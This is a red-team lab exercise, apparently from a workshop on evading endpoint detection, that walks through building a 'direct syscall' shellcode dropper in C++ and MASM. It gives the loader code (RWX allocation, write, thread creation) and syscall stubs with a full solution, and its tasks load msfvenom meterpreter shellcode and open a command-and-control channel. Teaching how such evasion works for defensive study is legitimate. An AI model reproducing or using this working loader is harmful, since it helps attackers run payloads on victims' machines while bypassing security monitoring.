## LAB Exercise 4:Direct Syscall Dropper
In this exercise we will make the second modification to the reference dropper, create the direct syscall dropper and implement the required syscalls or syscall stubs from each of the four native functions directly into the assembly (dropper). We call this the Low Level Direct Syscall Dropper, or LLDSC for short. 
![low_level_dropper_principal](https://user-images.githubusercontent.com/50073731/235438881-e4af349a-0109-4d8e-80e2-730915c927f6.png)

## Exercise 4 Tasks:
### Creating the Direct Syscall Dropper 
1. Download the LLDSC Visual Studio POC from the Code section of this chapter.
2. Most of the code is already implemented in the POC. But take a look at the .asm file and add the missing assembler code for the remaining three native APIs following the scheme of the already implemented code for the NTallocateVirtualMemory native API. 
3. Create x64 calc shellcode with msfvenom, copy it to the POC, compile it and run it for the first time. Check that the calc spawns correctly. 
4. Create a staged x64 meterpreter shellcode with msfvenom and copy it to the POC or replace the calc shellcode with it.  
5. Compile the POC as an x64 release. 
6. Create and run a staged x64 meterpreter listener using msfconsole.
7. Run your compiled .exe and check that a stable command and control channel opens. 
### Analysing the Direct Syscall Dropper
8. Use the Visual Studio **dumpbin** tool to analyse the dropper. Is the result what you expected?  
9. Use the **API Monitor** tool to analyse the compiled low level dropper in the context of the four APIs used. Is the result what you expected? 
10. Use the **x64dbg** debugger to analyse the compiled low level dropper: from which module and location are the syscalls of the four APIs used executed? Is the result what you expected? 
11. Use Process Hacker to analyse the call stack of the direct syscall dropper.


## Visual Studio
To create the Low-Level-Dropper project, follow the procedure of the High-Level-Dropper exercise, take a look to follow the necessary steps.
The code works as follows, shellcode declaration is the same as before in both droppers.
<details>
    
```
// Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
    unsigned char code[] = "\xfc\x48\x83";
```
    
</details>


The main code of the direct syscall dropper looks like the following and is already implemented in the POC. 
<details>
<summary>Code</summary>
    
```
#include <iostream>
#include <Windows.h>
#include "syscalls.h"

int main() {
    // Insert Meterpreter shellcode
    unsigned char code[] = "\xfc\x48\x83...";

    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
    // 'exec' will hold the base address of the allocated memory region
    void* exec = NULL;
    SIZE_T size = sizeof(code);
    NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into the allocated memory region
    SIZE_T bytesWritten;
    NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);

    // Execute the shellcode in memory using a new thread
    // Pass the address of the shellcode as the thread function (StartRoutine) and its parameter (Argument)
    HANDLE hThread;
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL);

    // Wait for the end of the thread to ensure the shellcode execution is complete
    NtWaitForSingleObject(hThread, FALSE, NULL);


    // Return 0 as the main function exit code
    return 0;
}
```
    
</details>

    
    
### Header File
Unlike the medium level dropper (NTAPIs), we no longer ask ntdll.dll for the function definition of the native APIs we are using. But we still want to use the native functions, so we need to define or implement the structure for all four native functions in a header file. In this case the header file is called syscalls.h and must also be included in the main code. All the structures are already implemented in the direct syscall dropper POC. If you want to check them manually, you should be able to find them in the Microsoft documentation, e.g. for [NtWriteVirtualMemory](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory).

### Assembly Instructions
Furthermore, we do not want to ask ntdll.dll for the syscall stub of the native functions we use, instead we want to manually implement the necessary assembly code into the assembly itself. As mentioned above, instead of using a tool to create the assembly instructions, we will manually implement the necessary code in our direct syscall POC for the best learning experience. To do this, you will find a file called ``syscalls.asm`` in the direct syscall dropper POC which contains part of the assembly code. The code needed to implement the syscall stub in the syscalls.asm file looks like this and can be used as a template to add the syscall stub for the other three missing native APIs ``NtWriteVirtualMemory``, ``NtCreateThreadEx``` and ``NtWaitForSingleObject``. It is one of your tasks to complete the missing assembly code.

<details>
<summary>Code</summary>

```
.CODE  ; Start the code section
; Procedure for the NtAllocateVirtualMemory syscall
NtAllocateVirtualMemory PROC
    mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
    mov eax, 18h                                    ; Move the syscall number into the eax register.
    syscall                                         ; Execute syscall.
    ret                                             ; Return from the procedure.
NtAllocateVirtualMemory ENDP     
END  ; End of the module    
```
    
</details>

<details>
    <summary>Solution</summary>

```
.CODE  ; Start the code section
; Procedure for the NtAllocateVirtualMemory syscall
NtAllocateVirtualMemory PROC
    mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
    mov eax, 18h                                    ; Move the syscall number into the eax register.
    syscall                                         ; Execute syscall.
    ret                                             ; Return from the procedure.
NtAllocateVirtualMemory ENDP                     	; End of the procedure.

; Similar procedures for NtWriteVirtualMemory syscalls
NtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, 3AH
    syscall
    ret
NtWriteVirtualMemory ENDP

; Similar procedures for NtCreateThreadEx syscalls
NtCreateThreadEx PROC
    mov r10, rcx
    mov eax, 0C2h
    syscall
    ret
NtCreateThreadEx ENDP

; Similar procedures for NtWaitForSingleObject syscalls
NtWaitForSingleObject PROC
    mov r10, rcx
    mov eax, 4
    syscall
    ret
NtWaitForSingleObject ENDP

END  ; End of the module
```
    
</details>

    
    
### Microsoft Macro Assembler (MASM)
We have already implemented all the necessary assembler code in the syscalls.asm file. But in order for the code to be interpreted correctly within the direct syscall POC, we need to do a few things. These steps are not done in the downloadable POC and must be done manually. First, we need to enable the Microsoft Macro Assembler (.masm) option in Build Dependencies/Build Customisations.
<details>
 
<p align="center">
<img width="1278" alt="image" src="https://user-images.githubusercontent.com/50073731/235457590-371f3519-b7cf-483d-9c1c-6bfd6368be42.png">
<img width="590" alt="image" src="https://user-images.githubusercontent.com/50073731/235457782-780d2136-30d7-4e87-a022-687ed2557b33.png">
</details>

Furthermore we need to set the Item Type of the syscalls.asm file to Microsoft Macro Assembler, otherwise we will get an unresolved symbol error in the context of the native APIs used in the direct syscall dropper. Furthermore we set Excluded from Build to no and Content to yes. 
<details>
<p align="center">
<img width="950" alt="image" src="https://user-images.githubusercontent.com/50073731/235471947-4bcd23fc-5093-4f4d-adc8-eb3ef36f139f.png">    
<img width="1237" alt="image" src="https://user-images.githubusercontent.com/50073731/235458968-e330799e-51ff-46bf-97ab-c7d3be7ea079.png">
<img width="778" alt="image" src="https://user-images.githubusercontent.com/50073731/235459219-4387dc48-56f8-481c-b978-1b786843a836.png">
</details>     
